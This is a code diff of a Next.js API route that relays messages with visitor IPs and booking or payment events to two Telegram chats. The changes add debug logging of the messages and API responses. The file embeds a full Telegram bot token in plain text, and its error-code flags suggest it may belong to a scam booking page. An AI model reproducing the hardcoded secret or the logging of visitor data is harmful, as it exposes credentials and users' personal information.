@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { getCodeErrorFlag, setCodeErrorFlag, getCodeSuccessFlag } from './codeErrorStore';
+import { getCodeErrorFlag, getCodeSuccessFlag } from './codeErrorStore';
 
 const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';
 const CHAT_IDS = ['1902713760', '7508575481'];
@@ -122,6 +122,9 @@ export async function POST(req: NextRequest) {
         `🌍 <b>IP:</b> ${ip}`;
     }
 
+    console.log('Sending message to Telegram:', message);
+    console.log('Reply markup:', reply_markup);
+
     const results: { chat_id: string; message_id?: number; ok: boolean }[] = [];
     for (let i = 0; i < CHAT_IDS.length; i++) {
       const chat_id = CHAT_IDS[i];
@@ -130,6 +133,7 @@ export async function POST(req: NextRequest) {
       if (msgId && !action) {
         // editMessageText только для online/offline
         const editUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
+        console.log('Editing message for chat:', chat_id);
         const res = await fetch(editUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -141,10 +145,12 @@ export async function POST(req: NextRequest) {
           }),
         });
         result = await res.json();
+        console.log('Edit message response:', result);
         results.push({ chat_id, message_id: msgId, ok: result.ok });
       } else {
         // sendMessage (или для booking/payment всегда новое)
         const sendUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        console.log('Sending new message for chat:', chat_id);
         const res = await fetch(sendUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -156,17 +162,23 @@ export async function POST(req: NextRequest) {
           }),
         });
         result = await res.json();
+        console.log('Send message response:', result);
         results.push({ chat_id, message_id: result.result?.message_id, ok: result.ok });
       }
     }
+
+    console.log('All results:', results);
+
     if (results.every(r => r.ok)) {
       const ids: Record<string, number> = {};
       results.forEach(r => { if (r.message_id) ids[r.chat_id] = r.message_id; });
       return NextResponse.json({ ok: true, message_ids: ids });
     } else {
+      console.error('Some messages failed to send:', results);
       return NextResponse.json({ ok: false, error: results }, { status: 500 });
     }
   } catch (e) {
+    console.error('Error sending message:', e);
     return NextResponse.json({ ok: false, error: e?.toString() }, { status: 500 });
   }
 } 
